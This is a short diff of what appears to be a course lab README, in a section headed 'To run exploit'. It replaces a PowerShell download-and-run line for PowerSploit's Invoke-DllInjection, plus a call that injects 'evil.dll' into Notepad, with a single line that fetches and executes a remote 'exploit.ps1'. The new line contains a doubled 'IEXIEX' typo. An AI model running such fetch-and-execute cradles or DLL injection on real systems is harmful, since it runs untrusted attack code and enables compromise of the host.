@@ -10,6 +10,5 @@ To create DLL files
 To run exploit
 
 ```
-IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1')
-Invoke-DllInjection -ProcessID $((Get-Process -Name Notepad).Id) -Dll evil.dll
+IEXIEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Pwspang/SC3010-Codes/main/exploit.ps1');
 ```
